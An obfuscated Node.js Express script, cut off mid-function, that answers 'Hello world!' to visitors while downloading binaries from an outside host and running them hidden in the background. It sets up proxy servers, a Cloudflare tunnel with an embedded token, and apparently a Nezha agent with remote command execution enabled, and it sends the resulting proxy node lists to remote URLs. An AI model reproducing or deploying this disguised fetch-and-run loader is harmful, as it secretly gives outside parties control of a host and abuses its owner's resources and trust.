const _0x7d32b=_0x1862;(function(_0x284b72,_0x49f302){const _0xe9ac1={_0x2ca022:0x13c,_0xbbf004:0x170,_0x481e43:0x11b,_0x4e031e:0x129,_0x1890d5:0x102,_0x1864da:0x142,_0x1100f0:0x16c,_0x44a994:0x19b,_0xb27ec1:0x18e},_0x1d62f1=_0x1862,_0x17734f=_0x284b72();while(!![]){try{const _0x33b385=parseInt(_0x1d62f1(_0xe9ac1._0x2ca022))/0x1*(-parseInt(_0x1d62f1(_0xe9ac1._0xbbf004))/0x2)+parseInt(_0x1d62f1(_0xe9ac1._0x481e43))/0x3*(-parseInt(_0x1d62f1(0x130))/0x4)+-parseInt(_0x1d62f1(0x115))/0x5*(-parseInt(_0x1d62f1(_0xe9ac1._0x4e031e))/0x6)+-parseInt(_0x1d62f1(0xea))/0x7*(parseInt(_0x1d62f1(_0xe9ac1._0x1890d5))/0x8)+-parseInt(_0x1d62f1(0x157))/0x9*(parseInt(_0x1d62f1(_0xe9ac1._0x1864da))/0xa)+-parseInt(_0x1d62f1(_0xe9ac1._0x1100f0))/0xb+parseInt(_0x1d62f1(_0xe9ac1._0x44a994))/0xc*(parseInt(_0x1d62f1(_0xe9ac1._0xb27ec1))/0xd);if(_0x33b385===_0x49f302)break;else _0x17734f['push'](_0x17734f['shift']());}catch(_0x1a1e47){_0x17734f['push'](_0x17734f['shift']());}}}(_0x3455,0x862cc));const express=require('express'),app=express(),axios=require(_0x7d32b(0x149)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x7d32b(0x189)),exec=promisify(require('child_process')[_0x7d32b(0x123)]),{execSync}=require(_0x7d32b(0x19e)),UPLOAD_URL=process[_0x7d32b(0xf2)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x7d32b(0xf2)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x7d32b(0xf2)][_0x7d32b(0x16f)]||![],FILE_PATH=process[_0x7d32b(0xf2)]['FILE_PATH']||_0x7d32b(0x1a4),SUB_PATH=process[_0x7d32b(0xf2)][_0x7d32b(0x167)]||_0x7d32b(0x166),PORT=process[_0x7d32b(0xf2)]['SERVER_PORT']||process['env']['PORT']||0xbb8,UUID=process[_0x7d32b(0xf2)][_0x7d32b(0x1af)]||_0x7d32b(0x159),NEZHA_SERVER=process[_0x7d32b(0xf2)][_0x7d32b(0x14f)]||'',NEZHA_PORT=process[_0x7d32b(0xf2)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x7d32b(0xf2)][_0x7d32b(0x164)]||'',ARGO_DOMAIN=process[_0x7d32b(0xf2)][_0x7d32b(0x160)]||'railway0122.601vcx.de5.net',ARGO_AUTH=process['env'][_0x7d32b(0x197)]||_0x7d32b(0x194),ARGO_PORT=process[_0x7d32b(0xf2)][_0x7d32b(0xed)]||0x1f41,CFIP=process['env'][_0x7d32b(0x125)]||_0x7d32b(0xec),CFPORT=process[_0x7d32b(0xf2)][_0x7d32b(0x121)]||0x1bb,NAME=process[_0x7d32b(0xf2)][_0x7d32b(0x13d)]||_0x7d32b(0x15e);!fs[_0x7d32b(0x165)](FILE_PATH)?(fs[_0x7d32b(0x128)](FILE_PATH),console[_0x7d32b(0x101)](FILE_PATH+_0x7d32b(0xf9))):console[_0x7d32b(0x101)](FILE_PATH+_0x7d32b(0xf6));function generateRandomName(){const _0x289f6d=_0x7d32b,_0x2ce864=_0x289f6d(0x11c);let _0x130e63='';for(let _0xaec609=0x0;_0xaec609<0x6;_0xaec609++){_0x130e63+=_0x2ce864['charAt'](Math[_0x289f6d(0x109)](Math[_0x289f6d(0x14c)]()*_0x2ce864[_0x289f6d(0x1a9)]));}return _0x130e63;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x7d32b(0x158)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x7d32b(0x158)](FILE_PATH,webName),botPath=path[_0x7d32b(0x158)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x7d32b(0x180)),listPath=path['join'](FILE_PATH,'list.txt'),bootLogPath=path[_0x7d32b(0x158)](FILE_PATH,_0x7d32b(0x1a1)),configPath=path[_0x7d32b(0x158)](FILE_PATH,_0x7d32b(0x106));function _0x3455(){const _0xe6d96c=['trojan','\x0a\x20\x20credentials-file:\x20','filter','util','\x20-s\x20','\x20>/dev/null\x202>&1\x20&','vless','clear','13339391XJXGJl','true','https://amd64.ssss.nyc.mn/v1','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','del\x20/f\x20/q\x20','message','eyJhIjoiMGFhNTQ4MmE3ZTMzMWMyYjg5MjJiNWRlZDk1NDBmMzAiLCJ0IjoiMGFiZjk2MDEtNzdmZC00MmU3LWFmOWMtZmZlZmMxMTE1MTY2IiwicyI6IlkyRXhNMlJrTTJJdE1tTm1OQzAwTXpZMExUZzVOek10WlRGaU5UQmpaR015TXpBMCJ9','?security=tls&sni=','web\x20running\x20error:\x20','ARGO_AUTH','/dev/null','\x22\x20>\x20/dev/null\x202>&1','tls','36BphUhV','https://amd64.ssss.nyc.mn/agent','false','child_process','https://arm64.ssss.nyc.mn/v1','Hello\x20world!','boot.log','\x20-c\x20','from','./tmp','rm\x20-rf\x20','close','/vmess-argo','post','length','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','443','?encryption=none&security=tls&sni=','\x20failed:\x20','ArgoDomain:','UUID','forEach','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','none','has','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','/config.json\x20>/dev/null\x202>&1\x20&','automatic\x20access\x20task\x20added\x20successfully','listen','\x20>\x20nul\x202>&1','amd','https://ipapi.co/json/','Nodes\x20uploaded\x20successfully','21FzymPD','pipe','cf.877774.xyz','ARGO_PORT','TunnelSecret','https://amd64.ssss.nyc.mn/web','arch','Error\x20in\x20startserver:','env','\x0a\x0atrojan://','--tls','country_code','\x20already\x20exists','match','fileName','\x20is\x20created','tunnel.json','Download\x20','stringify','/vless-argo','win32','createWriteStream','set','log','744424jOthWn','Unhandled\x20error\x20in\x20startserver:','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','App\x20is\x20running','config.json','freedom','https+local://8.8.8.8/dns-query','floor','Error\x20reading\x20boot.log:','readFileSync','/api/add-subscriptions','config.yaml','pkill\x20-f\x20\x22[','2083','Empowerment\x20success\x20for\x20','test','\x0aclient_secret:\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','tunnel.yml','2876470uDbLqb','stream','Add\x20automatic\x20access\x20task\x20faild:\x20','arm64','Skipping\x20adding\x20automatic\x20access\x20task','http\x20server\x20is\x20running\x20on\x20port:','789bUGTgu','abcdefghijklmnopqrstuvwxyz','Subscription\x20uploaded\x20successfully','xtls-rprx-vision','fileUrl','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','CFPORT','tcp','exec','vmess','CFIP','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','text/plain;\x20charset=utf-8','mkdirSync','6TsfVVS','/api/add-nodes','\x20-p\x20','error','Unknown','application/json','taskkill\x20/f\x20/im\x20','2780GqbQdV','8443','includes','Error\x20downloading\x20files:','get','substring','all','countryCode','pop','finish','success','/api/delete-nodes','1061378tTURiH','NAME','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','127.0.0.1','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','&fp=firefox&type=ws&host=','10zSVRzE','\x0avless://','split','status','2096','2053','\x0a\x0avmess://','axios','.exe\x20>\x20nul\x202>&1','block','random','&path=%2Fvless-argo%3Fed%3D2560#','/trojan-argo','NEZHA_SERVER','push','utf-8','writeFileSync','readdirSync','Content-Type','\x20successfully','nohup\x20','4731678svIIjA','join','02b34b2e-521c-46e0-bfa8-9866e00acda1','quic','catch','data','/sub.txt\x20saved\x20successfully','railway1','\x20is\x20running','ARGO_DOMAIN','arm','ARGO_DOMAIN:','https://arm64.ssss.nyc.mn/bot','NEZHA_KEY','existsSync','sub','SUB_PATH','response','Error\x20executing\x20command:\x20','statSync','\x20>/dev/null\x202>&1','11604681WOGuLL','basename','unlink','AUTO_ACCESS','2AbpAav','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','platform','toString','NEZHA\x20variable\x20is\x20empty,skip\x20running','unshift','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','org','npm\x20running\x20error:\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','php\x20running\x20error:\x20','base64','send','2087','/vmess-argo?ed=2560','sub.txt','\x0a\x20\x20tunnel:\x20','https://oooo.serv00.net/add-url','direct','http','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'];_0x3455=function(){return _0xe6d96c;};return _0x3455();}function deleteNodes(){const _0xafe09={_0x123b0f:0x17c,_0x244ef7:0x151,_0x282cb8:0x188,_0x157304:0x1a8,_0x304168:0x13b,_0x21596e:0x12e,_0xf29099:0x15b},_0xfb3290=_0x7d32b;try{if(!UPLOAD_URL)return;if(!fs[_0xfb3290(0x165)](subPath))return;let _0x5ba5cd;try{_0x5ba5cd=fs['readFileSync'](subPath,'utf-8');}catch{return null;}const _0x4c909f=Buffer['from'](_0x5ba5cd,_0xfb3290(_0xafe09._0x123b0f))['toString'](_0xfb3290(_0xafe09._0x244ef7)),_0x33295f=_0x4c909f[_0xfb3290(0x144)]('\x0a')[_0xfb3290(_0xafe09._0x282cb8)](_0x4e424d=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xfb3290(0x111)](_0x4e424d));if(_0x33295f[_0xfb3290(0x1a9)]===0x0)return;return axios[_0xfb3290(_0xafe09._0x157304)](UPLOAD_URL+_0xfb3290(_0xafe09._0x304168),JSON[_0xfb3290(0xfc)]({'nodes':_0x33295f}),{'headers':{'Content-Type':_0xfb3290(_0xafe09._0x21596e)}})[_0xfb3290(_0xafe09._0xf29099)](_0x1873a4=>{return null;}),null;}catch(_0x4e5e02){return null;}}function cleanupOldFiles(){const _0x31ef60=_0x7d32b;try{const _0x43eb13=fs[_0x31ef60(0x153)](FILE_PATH);_0x43eb13[_0x31ef60(0x1b0)](_0x4ac931=>{const _0x8a0a05=_0x31ef60,_0x221f5a=path['join'](FILE_PATH,_0x4ac931);try{const _0x33ce63=fs[_0x8a0a05(0x16a)](_0x221f5a);_0x33ce63['isFile']()&&fs['unlinkSync'](_0x221f5a);}catch(_0x3b5bee){}});}catch(_0x2fade5){}}app[_0x7d32b(0x134)]('/',function(_0x217d4b,_0x4a4b93){const _0x9b3f09=_0x7d32b;_0x4a4b93[_0x9b3f09(0x17d)](_0x9b3f09(0x1a0));});async function generateConfig(){const _0x31f426={_0x3db456:0xe0,_0x18b016:0x11e,_0x551d96:0xe0,_0x560d19:0x1a7,_0x25a343:0x14e,_0xd681aa:0x122,_0x2ec367:0x13f,_0x129335:0x122,_0x116388:0x184,_0x93a0db:0x19a,_0x1f6b70:0x13f,_0x59323a:0x1a7,_0xccb0a6:0x186,_0x14039c:0x15a,_0x2e2c51:0x14b,_0x3db08e:0x158},_0x7d39d1=_0x7d32b,_0x1d702d={'log':{'access':_0x7d39d1(0x198),'error':_0x7d39d1(0x198),'loglevel':_0x7d39d1(_0x31f426._0x3db456)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x7d39d1(_0x31f426._0x18b016)}],'decryption':_0x7d39d1(_0x31f426._0x551d96),'fallbacks':[{'dest':0xbb9},{'path':_0x7d39d1(0xfd),'dest':0xbba},{'path':_0x7d39d1(_0x31f426._0x560d19),'dest':0xbbb},{'path':_0x7d39d1(_0x31f426._0x25a343),'dest':0xbbc}]},'streamSettings':{'network':_0x7d39d1(_0x31f426._0xd681aa)}},{'port':0xbb9,'listen':_0x7d39d1(_0x31f426._0x2ec367),'protocol':_0x7d39d1(0x18c),'settings':{'clients':[{'id':UUID}],'decryption':_0x7d39d1(0xe0)},'streamSettings':{'network':_0x7d39d1(_0x31f426._0x129335),'security':_0x7d39d1(_0x31f426._0x551d96)}},{'port':0xbba,'listen':_0x7d39d1(0x13f),'protocol':_0x7d39d1(0x18c),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x7d39d1(0xe0)},'streamSettings':{'network':'ws','security':_0x7d39d1(0xe0),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x7d39d1(_0x31f426._0x116388),_0x7d39d1(_0x31f426._0x93a0db),_0x7d39d1(0x15a)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x7d39d1(_0x31f426._0x1f6b70),'protocol':_0x7d39d1(0x124),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x7d39d1(_0x31f426._0x59323a)}},'sniffing':{'enabled':!![],'destOverride':[_0x7d39d1(0x184),_0x7d39d1(_0x31f426._0x93a0db),_0x7d39d1(0x15a)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x7d39d1(0x13f),'protocol':_0x7d39d1(_0x31f426._0xccb0a6),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x7d39d1(_0x31f426._0x551d96),'wsSettings':{'path':_0x7d39d1(_0x31f426._0x25a343)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x7d39d1(0x19a),_0x7d39d1(_0x31f426._0x14039c)],'metadataOnly':![]}}],'dns':{'servers':[_0x7d39d1(0x108)]},'outbounds':[{'protocol':_0x7d39d1(0x107),'tag':_0x7d39d1(0x183)},{'protocol':'blackhole','tag':_0x7d39d1(_0x31f426._0x2e2c51)}]};fs[_0x7d39d1(0x152)](path[_0x7d39d1(_0x31f426._0x3db08e)](FILE_PATH,'config.json'),JSON[_0x7d39d1(0xfc)](_0x1d702d,null,0x2));}function getSystemArchitecture(){const _0x338478={_0x3f4dcd:0xf0,_0x16cf12:0x118,_0x726048:0x161},_0x289fd7=_0x7d32b,_0x3d8a2d=os[_0x289fd7(_0x338478._0x3f4dcd)]();return _0x3d8a2d==='arm'||_0x3d8a2d===_0x289fd7(_0x338478._0x16cf12)||_0x3d8a2d==='aarch64'?_0x289fd7(_0x338478._0x726048):_0x289fd7(0xe7);}function downloadFile(_0x1896bb,_0x5e20b4,_0x5def84){const _0x26dfc3={_0x2d7ea4:0xff,_0x5e7f48:0x134,_0x5556d1:0x116},_0x5e3aed={_0x3cf0a5:0x16d,_0x559a07:0x193},_0x3246a5={_0xcc72a:0x139},_0x272554=_0x7d32b,_0x42b745=_0x1896bb;!fs[_0x272554(0x165)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x515553=fs[_0x272554(_0x26dfc3._0x2d7ea4)](_0x42b745);axios({'method':_0x272554(_0x26dfc3._0x5e7f48),'url':_0x5e20b4,'responseType':_0x272554(_0x26dfc3._0x5556d1)})['then'](_0x318e8a=>{const _0x18ba3e={_0x59db3a:0x16e,_0x38974c:0xfb,_0x4360be:0x16d,_0x4e7346:0x1ad},_0xa94a34={_0x37198d:0x1a6,_0x5ea6d7:0xfb},_0x6fee68=_0x272554;_0x318e8a[_0x6fee68(0x15c)][_0x6fee68(0xeb)](_0x515553),_0x515553['on'](_0x6fee68(_0x3246a5._0xcc72a),()=>{const _0x3c33b4=_0x6fee68;_0x515553[_0x3c33b4(_0xa94a34._0x37198d)](),console['log'](_0x3c33b4(_0xa94a34._0x5ea6d7)+path[_0x3c33b4(0x16d)](_0x42b745)+_0x3c33b4(0x155)),_0x5def84(null,_0x42b745);}),_0x515553['on']('error',_0x1ee950=>{const _0x3b1dff=_0x6fee68;fs[_0x3b1dff(_0x18ba3e._0x59db3a)](_0x42b745,()=>{});const _0x5ea004=_0x3b1dff(_0x18ba3e._0x38974c)+path[_0x3b1dff(_0x18ba3e._0x4360be)](_0x42b745)+_0x3b1dff(_0x18ba3e._0x4e7346)+_0x1ee950[_0x3b1dff(0x193)];console['error'](_0x5ea004),_0x5def84(_0x5ea004);});})[_0x272554(0x15b)](_0xcfafe=>{const _0x324b79=_0x272554,_0x2bd33b='Download\x20'+path[_0x324b79(_0x5e3aed._0x3cf0a5)](_0x42b745)+_0x324b79(0x1ad)+_0xcfafe[_0x324b79(_0x5e3aed._0x559a07)];console['error'](_0x2bd33b),_0x5def84(_0x2bd33b);});}async function downloadFilesAndRun(){const _0xe387c0={_0x4ca2c6:0x101,_0x2b4c45:0x136,_0x3b25a5:0x12c,_0x3fb99a:0x132,_0x1ac77f:0x138,_0x246547:0x1ab,_0x4616b6:0x17e,_0x18f7b0:0x147,_0x3ac976:0xe1,_0x16b67a:0x19d,_0x5ec8cc:0x176,_0x37a3f0:0x191,_0x26b63a:0x152,_0x1d533d:0x156,_0x294dc6:0x17b,_0x1a3208:0x146,_0x16180a:0x17e,_0x3e628c:0x10f,_0xccbfae:0x18a,_0x728923:0xe2,_0x162779:0x15f,_0x2ebca1:0x174,_0x1916cf:0xe3,_0x31845c:0x15f,_0xe659ec:0x196,_0x2cbb80:0x165,_0x5dfa5c:0xf7,_0x632eae:0x140,_0x157578:0x126,_0x44403a:0x104,_0x4f3c2f:0x18b},_0x25d738={_0x2d07d3:0x1b0},_0x448022={_0x4d6894:0x165},_0x546bff=_0x7d32b,_0x3fa8d6=getSystemArchitecture(),_0x441a00=getFilesForArchitecture(_0x3fa8d6);if(_0x441a00[_0x546bff(0x1a9)]===0x0){console[_0x546bff(_0xe387c0._0x4ca2c6)](_0x546bff(0x171));return;}const _0x1ea35e=_0x441a00['map'](_0x27be3a=>{const _0x28cc02={_0x288b8f:0x11f};return new Promise((_0x4ab141,_0xae69e4)=>{const _0x5d917f=_0x1862;downloadFile(_0x27be3a[_0x5d917f(0xf8)],_0x27be3a[_0x5d917f(_0x28cc02._0x288b8f)],(_0x312fa7,_0x175ec0)=>{_0x312fa7?_0xae69e4(_0x312fa7):_0x4ab141(_0x175ec0);});});});try{await Promise[_0x546bff(_0xe387c0._0x2b4c45)](_0x1ea35e);}catch(_0x23ab1e){console[_0x546bff(_0xe387c0._0x3b25a5)](_0x546bff(0x133),_0x23ab1e);return;}function _0x175969(_0x38343a){const _0x5a863c=_0x546bff,_0x275394=0x1fd;_0x38343a[_0x5a863c(_0x25d738._0x2d07d3)](_0x446e59=>{const _0x4cfeba={_0x43713d:0x101},_0x126eb8=_0x5a863c;fs[_0x126eb8(_0x448022._0x4d6894)](_0x446e59)&&fs['chmod'](_0x446e59,_0x275394,_0x4323e4=>{const _0x32d1de=_0x126eb8;_0x4323e4?console[_0x32d1de(0x12c)]('Empowerment\x20failed\x20for\x20'+_0x446e59+':\x20'+_0x4323e4):console[_0x32d1de(_0x4cfeba._0x43713d)](_0x32d1de(0x110)+_0x446e59+':\x20'+_0x275394[_0x32d1de(0x173)](0x8));});});}const _0x850ea3=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x175969(_0x850ea3);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x56b199=NEZHA_SERVER[_0x546bff(_0xe387c0._0x3fb99a)](':')?NEZHA_SERVER['split'](':')[_0x546bff(_0xe387c0._0x1ac77f)]():'',_0x32cf6f=new Set([_0x546bff(_0xe387c0._0x246547),_0x546bff(0x131),_0x546bff(0x146),_0x546bff(_0xe387c0._0x4616b6),_0x546bff(0x10f),_0x546bff(_0xe387c0._0x18f7b0)]),_0x133770=_0x32cf6f[_0x546bff(_0xe387c0._0x3ac976)](_0x56b199)?_0x546bff(0x18f):_0x546bff(_0xe387c0._0x16b67a),_0x5cde70=_0x546bff(0x112)+NEZHA_KEY+_0x546bff(_0xe387c0._0x5ec8cc)+NEZHA_SERVER+_0x546bff(0x177)+_0x133770+_0x546bff(_0xe387c0._0x37a3f0)+UUID;fs[_0x546bff(_0xe387c0._0x26b63a)](path['join'](FILE_PATH,_0x546bff(0x10d)),_0x5cde70);const _0x538501=_0x546bff(_0xe387c0._0x1d533d)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x546bff(0xdf);try{await exec(_0x538501),console[_0x546bff(0x101)](phpName+'\x20is\x20running'),await new Promise(_0x429899=>setTimeout(_0x429899,0x3e8));}catch(_0x2fa72d){console[_0x546bff(0x12c)](_0x546bff(_0xe387c0._0x294dc6)+_0x2fa72d);}}else{let _0xb13a3f='';const _0x766642=['443',_0x546bff(0x131),_0x546bff(_0xe387c0._0x1a3208),_0x546bff(_0xe387c0._0x16180a),_0x546bff(_0xe387c0._0x3e628c),_0x546bff(0x147)];_0x766642['includes'](NEZHA_PORT)&&(_0xb13a3f=_0x546bff(0xf4));const _0x447d1f=_0x546bff(_0xe387c0._0x1d533d)+npmPath+_0x546bff(_0xe387c0._0xccbfae)+NEZHA_SERVER+':'+NEZHA_PORT+_0x546bff(0x12b)+NEZHA_KEY+'\x20'+_0xb13a3f+_0x546bff(_0xe387c0._0x728923);try{await exec(_0x447d1f),console[_0x546bff(_0xe387c0._0x4ca2c6)](npmName+_0x546bff(_0xe387c0._0x162779)),await new Promise(_0x19fda6=>setTimeout(_0x19fda6,0x3e8));}catch(_0x3095f1){console['error'](_0x546bff(0x179)+_0x3095f1);}}}else console['log'](_0x546bff(_0xe387c0._0x2ebca1));const _0x344dd3=_0x546bff(0x156)+webPath+_0x546bff(0x1a2)+FILE_PATH+_0x546bff(_0xe387c0._0x1916cf);try{await exec(_0x344dd3),console[_0x546bff(_0xe387c0._0x4ca2c6)](webName+_0x546bff(_0xe387c0._0x31845c)),await new Promise(_0x2b108e=>setTimeout(_0x2b108e,0x3e8));}catch(_0x3b052b){console[_0x546bff(0x12c)](_0x546bff(_0xe387c0._0xe659ec)+_0x3b052b);}if(fs[_0x546bff(_0xe387c0._0x2cbb80)](botPath)){let _0x17d27a;if(ARGO_AUTH[_0x546bff(_0xe387c0._0x5dfa5c)](/^[A-Z0-9a-z=]{120,250}$/))_0x17d27a=_0x546bff(_0xe387c0._0x632eae)+ARGO_AUTH;else ARGO_AUTH[_0x546bff(0xf7)](/TunnelSecret/)?_0x17d27a=_0x546bff(_0xe387c0._0x157578)+FILE_PATH+'/tunnel.yml\x20run':_0x17d27a=_0x546bff(0x120)+FILE_PATH+_0x546bff(_0xe387c0._0x44403a)+ARGO_PORT;try{await exec(_0x546bff(_0xe387c0._0x1d533d)+botPath+'\x20'+_0x17d27a+_0x546bff(_0xe387c0._0x4f3c2f)),console[_0x546bff(_0xe387c0._0x4ca2c6)](botName+_0x546bff(0x15f)),await new Promise(_0x74ed3c=>setTimeout(_0x74ed3c,0x7d0));}catch(_0x34c5f1){console[_0x546bff(_0xe387c0._0x3b25a5)](_0x546bff(0x169)+_0x34c5f1);}}await new Promise(_0xa8fc22=>setTimeout(_0xa8fc22,0x1388));}function getFilesForArchitecture(_0x485dbb){const _0x19a6bf={_0x36d43c:0xef,_0x3fbd76:0x19c,_0x7d9936:0x161,_0x1fbb6a:0x19f,_0x364f17:0x190},_0x80eea7=_0x7d32b;let _0x2cbd1c;_0x485dbb===_0x80eea7(0x161)?_0x2cbd1c=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x80eea7(0x163)}]:_0x2cbd1c=[{'fileName':webPath,'fileUrl':_0x80eea7(_0x19a6bf._0x36d43c)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2df1e8=_0x485dbb===_0x80eea7(0x161)?'https://arm64.ssss.nyc.mn/agent':_0x80eea7(_0x19a6bf._0x3fbd76);_0x2cbd1c['unshift']({'fileName':npmPath,'fileUrl':_0x2df1e8});}else{const _0x4c5bf9=_0x485dbb===_0x80eea7(_0x19a6bf._0x7d9936)?_0x80eea7(_0x19a6bf._0x1fbb6a):_0x80eea7(_0x19a6bf._0x364f17);_0x2cbd1c[_0x80eea7(0x175)]({'fileName':phpPath,'fileUrl':_0x4c5bf9});}}return _0x2cbd1c;}function argoType(){const _0x3259e2={_0x538677:0x101,_0x5d93d6:0x132,_0x5bd8dc:0xee,_0x230f0c:0x152,_0x2a99d4:0x181,_0x5efec3:0x114},_0x11e1ca=_0x7d32b;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x11e1ca(_0x3259e2._0x538677)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x11e1ca(_0x3259e2._0x5d93d6)](_0x11e1ca(_0x3259e2._0x5bd8dc))){fs[_0x11e1ca(_0x3259e2._0x230f0c)](path['join'](FILE_PATH,_0x11e1ca(0xfa)),ARGO_AUTH);const _0x462ee9=_0x11e1ca(_0x3259e2._0x2a99d4)+ARGO_AUTH[_0x11e1ca(0x144)]('\x22')[0xb]+_0x11e1ca(0x187)+path[_0x11e1ca(0x158)](FILE_PATH,'tunnel.json')+_0x11e1ca(0x185)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x11e1ca(0x13e);fs[_0x11e1ca(0x152)](path['join'](FILE_PATH,_0x11e1ca(_0x3259e2._0x5efec3)),_0x462ee9);}else console['log'](_0x11e1ca(0x113));}async function extractDomains(){const _0x213155={_0x53e34a:0x101,_0x30eeef:0x162,_0x444d47:0x144,_0x4e359c:0x1b0,_0x3c4df4:0x1aa,_0x9f0d00:0x1a1,_0x3dcc19:0x101,_0x45f893:0x15f,_0x27a985:0x12c,_0x4b4321:0x169,_0x4eb036:0x10a},_0x5f3ee8={_0x37a668:0x15c,_0x5d0af8:0xf5,_0x131b01:0x13a,_0xad9663:0x15c},_0x406b6d={_0x14f2a8:0xfe,_0x1b57c3:0x14a,_0x292d8a:0x10e,_0x26456b:0x135,_0x5a83f6:0x199},_0xc121ee={_0x4654cc:0x150},_0x5873f6=_0x7d32b;let _0x3263fe;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3263fe=ARGO_DOMAIN,console[_0x5873f6(_0x213155._0x53e34a)](_0x5873f6(_0x213155._0x30eeef),_0x3263fe),await _0x3c3292(_0x3263fe);else try{const _0x9f538b=fs['readFileSync'](path[_0x5873f6(0x158)](FILE_PATH,'boot.log'),'utf-8'),_0x8ab0a1=_0x9f538b[_0x5873f6(_0x213155._0x444d47)]('\x0a'),_0x58f0b1=[];_0x8ab0a1[_0x5873f6(_0x213155._0x4e359c)](_0x2d3e71=>{const _0x4e8146=_0x5873f6,_0x58410c=_0x2d3e71[_0x4e8146(0xf7)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x58410c){const _0x3e4a7d=_0x58410c[0x1];_0x58f0b1[_0x4e8146(_0xc121ee._0x4654cc)](_0x3e4a7d);}});if(_0x58f0b1[_0x5873f6(0x1a9)]>0x0)_0x3263fe=_0x58f0b1[0x0],console['log'](_0x5873f6(0x1ae),_0x3263fe),await _0x3c3292(_0x3263fe);else{console[_0x5873f6(_0x213155._0x53e34a)](_0x5873f6(_0x213155._0x3c4df4)),fs['unlinkSync'](path[_0x5873f6(0x158)](FILE_PATH,_0x5873f6(_0x213155._0x9f0d00)));async function _0x55af8b(){const _0x2ca0dd=_0x5873f6;try{process['platform']===_0x2ca0dd(_0x406b6d._0x14f2a8)?await exec(_0x2ca0dd(0x12f)+botName+_0x2ca0dd(_0x406b6d._0x1b57c3)):await exec(_0x2ca0dd(_0x406b6d._0x292d8a)+botName['charAt'](0x0)+']'+botName[_0x2ca0dd(_0x406b6d._0x26456b)](0x1)+_0x2ca0dd(_0x406b6d._0x5a83f6));}catch(_0x4e08c1){}}_0x55af8b(),await new Promise(_0x22429e=>setTimeout(_0x22429e,0xbb8));const _0x16a2c5=_0x5873f6(0x120)+FILE_PATH+_0x5873f6(0x104)+ARGO_PORT;try{await exec(_0x5873f6(0x156)+botPath+'\x20'+_0x16a2c5+_0x5873f6(0x18b)),console[_0x5873f6(_0x213155._0x3dcc19)](botName+_0x5873f6(_0x213155._0x45f893)),await new Promise(_0xc78b3a=>setTimeout(_0xc78b3a,0xbb8)),await extractDomains();}catch(_0x45aa13){console[_0x5873f6(_0x213155._0x27a985)](_0x5873f6(_0x213155._0x4b4321)+_0x45aa13);}}}catch(_0x86a892){console[_0x5873f6(0x12c)](_0x5873f6(_0x213155._0x4eb036),_0x86a892);}async function _0x51bb25(){const _0x135ec4=_0x5873f6;try{const _0x5dc39f=await axios[_0x135ec4(0x134)](_0x135ec4(0xe8),{'timeout':0xbb8});if(_0x5dc39f[_0x135ec4(_0x5f3ee8._0x37a668)]&&_0x5dc39f['data'][_0x135ec4(_0x5f3ee8._0x5d0af8)]&&_0x5dc39f['data'][_0x135ec4(0x178)])return 